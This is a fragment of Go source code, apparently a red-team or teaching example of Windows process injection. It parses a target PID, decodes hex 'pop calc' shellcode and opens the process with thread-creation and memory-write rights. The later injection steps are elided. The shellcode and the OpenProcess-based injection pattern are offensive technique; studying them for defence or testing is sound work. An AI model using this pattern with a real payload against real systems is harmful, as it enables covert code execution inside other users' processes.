...
func main() {
	...
	_pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	flag.Parse()
	pid := uint32(*_pid)
	fmt.Printf("PID:%v\n", *_pid)
	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString("505152535657556a605a687465737454594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3")
	if errShellcode != nil {
	...
	pHandle, errOpenProcess := syscall.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, pid)
	...
	errCloseHandle := syscall.CloseHandle(pHandle)
